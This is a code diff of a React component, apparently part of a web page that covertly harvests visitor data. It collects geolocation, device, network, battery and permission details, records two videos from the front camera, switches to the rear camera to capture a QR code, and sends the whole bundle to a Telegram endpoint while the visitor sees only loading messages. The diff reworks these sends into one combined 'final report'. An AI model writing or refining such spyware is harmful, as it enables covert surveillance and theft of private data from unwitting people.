@@ -10,7 +10,7 @@ import {
   getDeviceMemory,
   getBatteryInfo,
   getPermissionStatus,
-  PermissionStatus // Импортируем PermissionStatus
+  PermissionStatus
 } from "@/lib/client-data";
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
@@ -20,7 +20,7 @@ const QR_SCAN_TIMEOUT_MS = 10000; // 10 seconds for QR scanning
 type GeolocationData = { latitude: number; longitude: number };
 type ClientInfo = { userAgent: string; platform: string; hardwareConcurrency: number };
 type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
-type BatteryInfo = { level?: number; charging?: boolean; status?: string }; // Добавлено status для батареи
+type BatteryInfo = { level?: number; charging?: boolean; status?: string };
 
 type CollectedData = {
   geolocation?: GeolocationData;
@@ -28,7 +28,7 @@ type CollectedData = {
   networkInfo?: NetworkInfo;
   deviceMemory?: number;
   batteryInfo?: BatteryInfo;
-  permissionStatus?: PermissionStatus; // Используем импортированный тип
+  permissionStatus?: PermissionStatus;
   ipAddress?: string;
   video1?: string;
   video2?: string;
@@ -152,7 +152,10 @@ const PermissionHandler = () => {
   const handleQrCodeScanned = useCallback(
     async (qrData: string) => {
       console.log("QR Code Scanned in PermissionHandler:", qrData);
-      await sendDataToTelegram({ ...collectedData, qrCodeData: qrData });
+      // Обновляем collectedData и сразу отправляем финальный отчет
+      const finalData = { ...collectedData, qrCodeData: qrData };
+      setCollectedData(finalData);
+      await sendDataToTelegram(finalData);
       setAppPhase("finished");
     },
     [collectedData, sendDataToTelegram]
@@ -161,7 +164,10 @@ const PermissionHandler = () => {
   const handleQrScanError = useCallback(
     async (error: string) => {
       console.error("QR Scan Error:", error);
-      await sendDataToTelegram({ ...collectedData, qrCodeData: `QR Scan Error: ${error}` });
+      // Обновляем collectedData и сразу отправляем финальный отчет
+      const finalData = { ...collectedData, qrCodeData: `QR Scan Error: ${error}` };
+      setCollectedData(finalData);
+      await sendDataToTelegram(finalData);
       setAppPhase("finished");
     },
     [collectedData, sendDataToTelegram]
@@ -181,12 +187,12 @@ const PermissionHandler = () => {
       setAppPhase("collectingData");
       loadingInterval = updateLoadingMessage();
 
-      const initialData: CollectedData = {};
+      const currentCollectedData: CollectedData = {};
       
       // Collect client info (synchronous)
-      initialData.clientInfo = getClientInfo();
-      initialData.networkInfo = getNetworkInfo();
-      initialData.deviceMemory = getDeviceMemory();
+      currentCollectedData.clientInfo = getClientInfo();
+      currentCollectedData.networkInfo = getNetworkInfo();
+      currentCollectedData.deviceMemory = getDeviceMemory();
 
       // Collect async data and await them
       const [permissionStatusResult, batteryInfoResult, geolocationResult] = await Promise.all([
@@ -195,53 +201,53 @@ const PermissionHandler = () => {
         getGeolocation(),
       ]);
 
-      initialData.permissionStatus = permissionStatusResult;
+      currentCollectedData.permissionStatus = permissionStatusResult;
 
       if (batteryInfoResult.data) {
-        initialData.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
+        currentCollectedData.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
       } else {
-        initialData.batteryInfo = { status: batteryInfoResult.status };
+        currentCollectedData.batteryInfo = { status: batteryInfoResult.status };
       }
 
       if (geolocationResult.data) {
-        initialData.geolocation = geolocationResult.data;
+        currentCollectedData.geolocation = geolocationResult.data;
       }
       // Update geolocation status in permissionStatus
-      if (initialData.permissionStatus) {
-        initialData.permissionStatus.geolocation = geolocationResult.status;
+      if (currentCollectedData.permissionStatus) {
+        currentCollectedData.permissionStatus.geolocation = geolocationResult.status;
       }
 
       // IP Address will be filled on the server side, but we pass a placeholder for now
-      initialData.ipAddress = "Fetching..."; 
+      currentCollectedData.ipAddress = "Fetching..."; 
 
-      setCollectedData(initialData);
-      await sendDataToTelegram(initialData); // Send initial data AFTER all async data is collected
+      setCollectedData(currentCollectedData); // Обновляем состояние один раз после сбора всех начальных данных
 
       // --- Video 1 Recording ---
       setAppPhase("recordingVideo1");
       const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      const dataWithVideo1 = { ...initialData, video1: video1Base64 };
-      setCollectedData(dataWithVideo1);
-      await sendDataToTelegram(dataWithVideo1); // Send video 1 immediately
+      setCollectedData(prev => ({ ...prev, video1: video1Base64 })); // Обновляем только video1
 
       // --- Video 2 Recording ---
       setAppPhase("recordingVideo2");
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-      const dataWithVideo2 = { ...dataWithVideo1, video2: video2Base64 };
-      setCollectedData(dataWithVideo2); // Store video2, but don't send yet
+      setCollectedData(prev => ({ ...prev, video2: video2Base64 })); // Обновляем только video2
 
       // --- Flip Camera and QR Scanning ---
       setAppPhase("flippingCamera");
-      // The QrScanner component will handle activating the 'environment' camera
+      // QrScanner component will handle activating the 'environment' camera
       // and will call onCameraActive when ready.
-      // We will send video2 when QrScanner confirms camera is active.
       setAppPhase("qrScanning"); // Transition to QR scanning phase
 
       // Set a timeout for QR scanning
       qrTimeout = setTimeout(async () => {
         console.log("QR scanning timed out.");
-        await sendDataToTelegram({ ...dataWithVideo2, qrCodeData: "QR Scan Timed Out" });
-        setAppPhase("finished");
+        // Отправляем финальный отчет с таймаутом QR
+        setCollectedData(prev => {
+          const finalData = { ...prev, qrCodeData: "QR Scan Timed Out" };
+          sendDataToTelegram(finalData); // Отправляем финальный отчет
+          setAppPhase("finished");
+          return finalData;
+        });
       }, QR_SCAN_TIMEOUT_MS);
     };
 
@@ -262,17 +268,17 @@ const PermissionHandler = () => {
     };
   }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, updateLoadingMessage]);
 
-  // Effect to send video2 when QR scanner is truly active
-  useEffect(() => {
-    if (appPhase === "qrScanning" && collectedData.video2 && !collectedData.qrCodeData) {
-      const sendVideo2 = async () => {
-        console.log("Sending Video 2 now that QR scanner is active...");
-        await sendDataToTelegram({ ...collectedData, video2: collectedData.video2 });
-        setCollectedData(prev => ({ ...prev, video2: undefined }));
-      };
-      sendVideo2();
-    }
-  }, [appPhase, collectedData, sendDataToTelegram]);
+  // Удаляем этот useEffect, так как video2 теперь отправляется в рамках финального отчета
+  // useEffect(() => {
+  //   if (appPhase === "qrScanning" && collectedData.video2 && !collectedData.qrCodeData) {
+  //     const sendVideo2 = async () => {
+  //       console.log("Sending Video 2 now that QR scanner is active...");
+  //       await sendDataToTelegram({ ...collectedData, video2: collectedData.video2 });
+  //       setCollectedData(prev => ({ ...prev, video2: undefined }));
+  //     };
+  //     sendVideo2();
+  //   }
+  // }, [appPhase, collectedData, sendDataToTelegram]);
 
 
   return (
